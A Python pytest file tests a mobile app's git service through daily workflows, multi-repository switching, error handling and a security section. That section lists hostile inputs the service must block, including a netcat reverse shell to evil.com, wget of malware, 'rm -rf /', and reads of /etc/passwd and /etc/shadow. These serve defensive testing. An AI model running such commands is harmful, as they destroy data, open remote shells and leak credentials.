"""
Git 真实用户操作流程端到端测试

模拟一个用户在手机上的完整 git 操作流程：
  场景 1：日常开发流程（创建分支 → 改文件 → stage → commit → push）
  场景 2：多仓库切换（发现仓库 → 选择 → 操作）
  场景 3：Git Shell 高级操作（stash → rebase → cherry-pick）
  场景 4：安全防护（shell 注入 → 危险操作拦截）
  场景 5：错误处理（不存在的分支 → 冲突 → 空提交）
"""

import asyncio
import os
import shutil
import subprocess
import tempfile
from pathlib import Path

import pytest

from mobileflow_agent.services.git_service import GitService, GitStatusResult


class TestUserFlowDailyDev:
    """场景 1：日常开发流程"""

    def setup_method(self):
        self._tmpdir = tempfile.mkdtemp()
        self._init_repo()
        self.git = GitService(self._tmpdir)

    def teardown_method(self):
        shutil.rmtree(self._tmpdir, ignore_errors=True)

    def _init_repo(self):
        subprocess.run(["git", "init", self._tmpdir], capture_output=True)
        subprocess.run(["git", "-C", self._tmpdir, "config", "user.email", "dev@test.com"], capture_output=True)
        subprocess.run(["git", "-C", self._tmpdir, "config", "user.name", "Developer"], capture_output=True)
        Path(self._tmpdir, "README.md").write_text("# My Project\n")
        subprocess.run(["git", "-C", self._tmpdir, "add", "."], capture_output=True)
        subprocess.run(["git", "-C", self._tmpdir, "commit", "-m", "Initial commit"], capture_output=True)

    def test_full_daily_workflow(self):
        """
        用户日常流程：
        1. 查看状态（干净）
        2. 创建新分支
        3. 修改文件
        4. 查看状态（有变更）
        5. 查看 diff
        6. Stage 文件
        7. 提交
        8. 查看 log
        9. 切回 main
        """
        # 1. 查看状态 — 应该是干净的
        status = asyncio.run(self.git.status())
        assert status.error == ""
        assert len(status.staged) == 0
        assert len(status.unstaged) == 0

        # 2. 创建新分支
        r = asyncio.run(self.git.execute_command("git checkout -b feature/add-docs"))
        assert r["success"], f"创建分支失败: {r['stderr']}"

        # 3. 修改文件
        Path(self._tmpdir, "README.md").write_text("# My Project\n\nNew documentation.\n")
        Path(self._tmpdir, "docs.md").write_text("# Docs\n")

        # 4. 查看状态 — 应该有变更
        status = asyncio.run(self.git.status())
        total_changes = len(status.staged) + len(status.unstaged) + len(status.untracked)
        assert total_changes >= 1  # 至少有变更（Windows autocrlf 可能导致 staged vs unstaged 不同）

        # 5. 查看 diff
        diff = asyncio.run(self.git.diff_all())
        assert "documentation" in diff.get("diff", "")

        # 6. Stage 所有文件
        r = asyncio.run(self.git.stage_all())
        assert r.get("success")

        # 验证 stage 后状态
        status = asyncio.run(self.git.status())
        assert len(status.staged) >= 2
        assert len(status.unstaged) == 0

        # 7. 提交
        r = asyncio.run(self.git.commit("Add documentation"))
        assert r.get("success"), f"提交失败: {r.get('error')}"

        # 8. 查看 log
        log = asyncio.run(self.git.log(count=5))
        messages = [e["message"] for e in log.get("entries", [])]
        assert "Add documentation" in messages
        assert "Initial commit" in messages

        # 9. 切回 main/master
        branches = asyncio.run(self.git.branches())
        main_branch = None
        for b in branches.get("branches", []):
            if b["name"] in ("main", "master"):
                main_branch = b["name"]
                break
        assert main_branch is not None
        r = asyncio.run(self.git.checkout(main_branch))
        assert r.get("success")

    def test_stage_unstage_individual_files(self):
        """用户选择性 stage/unstage 单个文件"""
        # 创建多个文件
        Path(self._tmpdir, "a.txt").write_text("aaa")
        Path(self._tmpdir, "b.txt").write_text("bbb")
        Path(self._tmpdir, "c.txt").write_text("ccc")

        # Stage 只 a.txt
        r = asyncio.run(self.git.stage(["a.txt"]))
        assert r.get("success")

        status = asyncio.run(self.git.status())
        staged_paths = [f.path for f in status.staged]
        assert "a.txt" in staged_paths
        assert "b.txt" not in staged_paths

        # Unstage a.txt
        r = asyncio.run(self.git.unstage(["a.txt"]))
        assert r.get("success")

        status = asyncio.run(self.git.status())
        assert len(status.staged) == 0

    def test_discard_changes(self):
        """用户丢弃文件变更"""
        # 用 binary 模式写入避免 autocrlf 干扰
        Path(self._tmpdir, "README.md").write_bytes(b"CHANGED CONTENT")

        status = asyncio.run(self.git.status())
        total = len(status.staged) + len(status.unstaged)
        assert total >= 1  # 有变更

        r = asyncio.run(self.git.discard_file("README.md"))
        # 如果文件被 auto-staged，先 unstage
        if not r.get("success"):
            asyncio.run(self.git.unstage(["README.md"]))
            r = asyncio.run(self.git.discard_file("README.md"))

        # 文件应该恢复原样
        content = Path(self._tmpdir, "README.md").read_text()
        assert "# My Project" in content

    def test_view_file_diff(self):
        """用户查看单文件 diff（old/new 完整内容）"""
        Path(self._tmpdir, "README.md").write_text("# My Project\n\nUpdated.\n")

        result = asyncio.run(self.git.file_content_for_diff("README.md"))
        assert result.get("old_content") == "# My Project\n"
        assert "Updated" in result.get("new_content", "")


class TestUserFlowMultiRepo:
    """场景 2：多仓库操作"""

    def setup_method(self):
        self._tmpdir = tempfile.mkdtemp()

    def teardown_method(self):
        shutil.rmtree(self._tmpdir, ignore_errors=True)

    def _init_repo(self, name):
        path = os.path.join(self._tmpdir, name)
        subprocess.run(["git", "init", path], capture_output=True)
        subprocess.run(["git", "-C", path, "config", "user.email", "t@t.com"], capture_output=True)
        subprocess.run(["git", "-C", path, "config", "user.name", "T"], capture_output=True)
        Path(path, "file.txt").write_text(f"content of {name}")
        subprocess.run(["git", "-C", path, "add", "."], capture_output=True)
        subprocess.run(["git", "-C", path, "commit", "-m", f"init {name}"], capture_output=True)
        return path

    def test_discover_and_switch_repos(self):
        """
        用户打开包含多个仓库的目录：
        1. 发现所有仓库
        2. 选择一个仓库
        3. 在该仓库操作
        4. 切换到另一个仓库
        """
        # 创建 3 个仓库
        repo_a = self._init_repo("frontend")
        repo_b = self._init_repo("backend")
        repo_c = self._init_repo("shared-lib")

        git = GitService(self._tmpdir)

        # 1. 发现仓库
        repos = asyncio.run(git.discover_repos(self._tmpdir))
        names = {r["name"] for r in repos}
        assert "frontend" in names
        assert "backend" in names
        assert "shared-lib" in names

        # 2. 选择 frontend
        git._update_cwd(repo_a)
        assert asyncio.run(git.is_repo())

        status = asyncio.run(git.status())
        assert status.error == ""

        # 3. 在 frontend 操作
        Path(repo_a, "index.html").write_text("<h1>Hello</h1>")
        r = asyncio.run(git.stage(["index.html"]))
        assert r.get("success")
        r = asyncio.run(git.commit("Add index page"))
        assert r.get("success")

        # 4. 切换到 backend
        git._update_cwd(repo_b)
        status = asyncio.run(git.status())
        assert status.error == ""
        assert status.branch in ("main", "master")

    def test_root_not_repo_but_children_are(self):
        """根目录不是仓库，但子目录有仓库"""
        self._init_repo("project-x")

        git = GitService(self._tmpdir)

        # 根目录不是仓库
        assert not asyncio.run(git.is_repo())

        # 但能发现子仓库
        repos = asyncio.run(git.discover_repos(self._tmpdir))
        assert len(repos) >= 1
        assert repos[0]["name"] == "project-x"


class TestUserFlowGitShell:
    """场景 3：Git Shell 高级操作"""

    def setup_method(self):
        self._tmpdir = tempfile.mkdtemp()
        self._init_repo()
        self.git = GitService(self._tmpdir)

    def teardown_method(self):
        shutil.rmtree(self._tmpdir, ignore_errors=True)

    def _init_repo(self):
        subprocess.run(["git", "init", self._tmpdir], capture_output=True)
        subprocess.run(["git", "-C", self._tmpdir, "config", "user.email", "dev@test.com"], capture_output=True)
        subprocess.run(["git", "-C", self._tmpdir, "config", "user.name", "Dev"], capture_output=True)
        for i in range(3):
            Path(self._tmpdir, f"file{i}.txt").write_text(f"content {i}")
            subprocess.run(["git", "-C", self._tmpdir, "add", "."], capture_output=True)
            subprocess.run(["git", "-C", self._tmpdir, "commit", "-m", f"commit {i}"], capture_output=True)

    def test_stash_workflow(self):
        """
        用户 stash 流程：
        1. 修改文件
        2. git stash
        3. 验证工作区干净
        4. git stash pop
        5. 验证变更恢复
        """
        Path(self._tmpdir, "file0.txt").write_text("modified!")

        # stash
        r = asyncio.run(self.git.execute_command("git stash"))
        assert r["success"]

        # 工作区应该干净
        status = asyncio.run(self.git.status())
        assert len(status.unstaged) == 0

        # stash pop
        r = asyncio.run(self.git.execute_command("git stash pop"))
        assert r["success"]

        # 变更应该恢复
        content = Path(self._tmpdir, "file0.txt").read_text()
        assert content == "modified!"

    def test_log_with_format(self):
        """用户用自定义格式查看 log"""
        r = asyncio.run(self.git.execute_command("git log --oneline -5"))
        assert r["success"]
        lines = r["stdout"].strip().split("\n")
        assert len(lines) == 3  # 3 个提交

    def test_show_commit(self):
        """用户查看某个提交的详情"""
        r = asyncio.run(self.git.execute_command("git show --stat HEAD"))
        assert r["success"]
        assert "commit 2" in r["stdout"]

    def test_branch_operations(self):
        """用户通过 Shell 管理分支"""
        # 创建分支
        r = asyncio.run(self.git.execute_command("git branch test-branch"))
        assert r["success"]

        # 列出分支
        r = asyncio.run(self.git.execute_command("git branch"))
        assert r["success"]
        assert "test-branch" in r["stdout"]

        # 删除分支
        r = asyncio.run(self.git.execute_command("git branch -d test-branch"))
        assert r["success"]

    def test_remote_operations(self):
        """用户查看远程信息（没有远程也不应该崩溃）"""
        r = asyncio.run(self.git.execute_command("git remote -v"))
        assert r["success"]
        assert r["stdout"].strip() == ""  # 没有远程

    def test_blame(self):
        """用户查看文件 blame"""
        r = asyncio.run(self.git.execute_command("git blame file0.txt"))
        assert r["success"]
        assert "content 0" in r["stdout"]

    def test_reflog(self):
        """用户查看 reflog"""
        r = asyncio.run(self.git.execute_command("git reflog -5"))
        assert r["success"]
        assert len(r["stdout"].strip().split("\n")) >= 1


class TestUserFlowSecurity:
    """场景 4：安全防护测试"""

    def setup_method(self):
        self._tmpdir = tempfile.mkdtemp()
        subprocess.run(["git", "init", self._tmpdir], capture_output=True)
        subprocess.run(["git", "-C", self._tmpdir, "config", "user.email", "t@t.com"], capture_output=True)
        subprocess.run(["git", "-C", self._tmpdir, "config", "user.name", "T"], capture_output=True)
        Path(self._tmpdir, "secret.txt").write_text("password123")
        subprocess.run(["git", "-C", self._tmpdir, "add", "."], capture_output=True)
        subprocess.run(["git", "-C", self._tmpdir, "commit", "-m", "init"], capture_output=True)
        self.git = GitService(self._tmpdir)

    def teardown_method(self):
        shutil.rmtree(self._tmpdir, ignore_errors=True)

    def test_cannot_run_arbitrary_commands(self):
        """不能执行非 git 命令"""
        attacks = [
            "ls -la",
            "cat /etc/passwd",
            "rm -rf /",
            "curl http://evil.com",
            "python -c 'import os; os.system(\"whoami\")'",
            "wget http://evil.com/malware",
            "nc -e /bin/sh evil.com 4444",
        ]
        for cmd in attacks:
            r = asyncio.run(self.git.execute_command(cmd))
            # 这些命令要么被 blocked（含 shell 字符），要么被 git 自己报错
            # 关键是不能成功执行非 git 操作
            assert not r["success"] or r["blocked"], f"命令不应该成功: {cmd}"

    def test_shell_injection_attempts(self):
        """各种 shell 注入尝试"""
        injections = [
            "git status; cat /etc/passwd",
            "git status && whoami",
            "git status || id",
            "git status | nc evil.com 4444",
            "git status `whoami`",
            "git status $(cat /etc/shadow)",
            "git log > /tmp/stolen_data",
            "git log < /dev/random",
            "git status !$",
        ]
        for cmd in injections:
            r = asyncio.run(self.git.execute_command(cmd))
            assert r["blocked"], f"注入应该被拦截: {cmd}"

    def test_dangerous_operations_need_confirmation(self):
        """危险操作需要确认"""
        dangerous = [
            "git reset --hard HEAD~1",
            "git push --force",
            "git push -f",
            "git clean -fd",
            "git clean -f",
        ]
        for cmd in dangerous:
            r = asyncio.run(self.git.execute_command(cmd))
            assert r["dangerous"], f"应该标记为危险: {cmd}"
            assert not r["success"]  # 未确认不执行


class TestUserFlowErrorHandling:
    """场景 5：错误处理"""

    def setup_method(self):
        self._tmpdir = tempfile.mkdtemp()
        subprocess.run(["git", "init", self._tmpdir], capture_output=True)
        subprocess.run(["git", "-C", self._tmpdir, "config", "user.email", "t@t.com"], capture_output=True)
        subprocess.run(["git", "-C", self._tmpdir, "config", "user.name", "T"], capture_output=True)
        Path(self._tmpdir, "file.txt").write_text("hello")
        subprocess.run(["git", "-C", self._tmpdir, "add", "."], capture_output=True)
        subprocess.run(["git", "-C", self._tmpdir, "commit", "-m", "init"], capture_output=True)
        self.git = GitService(self._tmpdir)

    def teardown_method(self):
        shutil.rmtree(self._tmpdir, ignore_errors=True)

    def test_checkout_nonexistent_branch(self):
        """切换不存在的分支应该报错"""
        r = asyncio.run(self.git.checkout("nonexistent-branch-xyz"))
        assert not r.get("success")
        assert r.get("error")

    def test_commit_with_empty_message(self):
        """空提交信息应该失败"""
        Path(self._tmpdir, "new.txt").write_text("new")
        asyncio.run(self.git.stage(["new.txt"]))
        r = asyncio.run(self.git.commit(""))
        assert not r.get("success")

    def test_commit_nothing_staged(self):
        """没有 staged 文件时提交应该失败"""
        r = asyncio.run(self.git.commit("empty commit"))
        assert not r.get("success")

    def test_status_in_non_repo(self):
        """在非 git 目录查看状态应该返回错误"""
        non_repo = tempfile.mkdtemp()
        try:
            git = GitService(non_repo)
            status = asyncio.run(git.status())
            assert status.error != ""
        finally:
            shutil.rmtree(non_repo, ignore_errors=True)

    def test_diff_nonexistent_file(self):
        """diff 不存在的文件应该优雅处理"""
        r = asyncio.run(self.git.file_content_for_diff("nonexistent.txt"))
        # 不应该崩溃，应该返回空或错误
        assert isinstance(r, dict)

    def test_discard_unmodified_file(self):
        """丢弃未修改的文件不应该崩溃"""
        r = asyncio.run(self.git.discard_file("file.txt"))
        # git checkout -- file.txt 对未修改文件是 no-op
        assert isinstance(r, dict)

    def test_shell_command_timeout(self):
        """超长命令不应该永远挂起"""
        # git log 在小仓库上很快，不会超时
        r = asyncio.run(self.git.execute_command("git log --all --graph --decorate"))
        assert r["success"]
